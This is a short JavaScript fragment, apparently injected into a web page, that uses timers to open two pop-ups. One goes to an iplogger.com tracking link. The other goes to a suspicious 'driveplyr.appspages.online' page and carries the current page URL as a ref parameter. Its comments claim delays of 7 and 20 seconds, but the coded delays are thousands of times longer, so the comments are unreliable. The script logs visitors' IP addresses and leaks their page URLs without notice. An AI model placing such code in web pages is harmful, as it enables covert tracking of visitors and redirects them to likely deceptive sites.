 // Function to open the first link after 7 seconds
    function openFirstLink() {
      window.open("https://iplogger.com/cxdiintelegram");
    }

    // Function to open the second link after 20 seconds
    function openSecondLink() {
      var currentURL = window.location.href;
      window.open("https://driveplyr.appspages.online/?ref=" + encodeURIComponent(currentURL));
    }

    // Wait for 7 seconds and then open the first link
    setTimeout(openFirstLink, 7000000);

    // Wait for 20 seconds and then open the second link
    setTimeout(openSecondLink, 20000000);